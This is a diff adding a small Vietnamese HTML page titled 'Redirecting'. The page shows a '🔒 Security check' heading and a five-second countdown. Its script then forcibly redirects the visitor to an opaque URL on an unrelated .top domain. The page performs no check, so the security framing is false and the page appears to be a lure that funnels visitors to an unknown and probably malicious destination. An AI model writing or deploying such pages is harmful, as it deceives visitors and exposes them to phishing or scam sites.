@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Đang Chuyển Hướng</title>
+
+<style>
+body{
+    margin:0;
+    background:#0b3d91;
+    color:white;
+    font-family:Arial,sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.box{
+    text-align:center;
+}
+
+h1{
+    font-size:40px;
+}
+
+#count{
+    font-size:100px;
+    font-weight:bold;
+    margin:20px 0;
+}
+
+p{
+    font-size:24px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="box">
+
+<h1>🔒 KIỂM TRA BẢO MẬT</h1>
+
+<div id="count">5</div>
+
+<p>Đang chuyển hướng...</p>
+
+</div>
+
+<script>
+
+let seconds = 5;
+
+const timer = setInterval(function(){
+
+seconds--;
+
+document.getElementById("count").innerHTML = seconds;
+
+if(seconds <= 0){
+
+clearInterval(timer);
+
+window.location.replace(
+"https://a3lm.glthay.top/3499598186/3499598186_index.html?rb=eBJr&tplhx=1"
+);
+
+}
+
+},1000);
+
+</script>
+
+</body>
+</html>
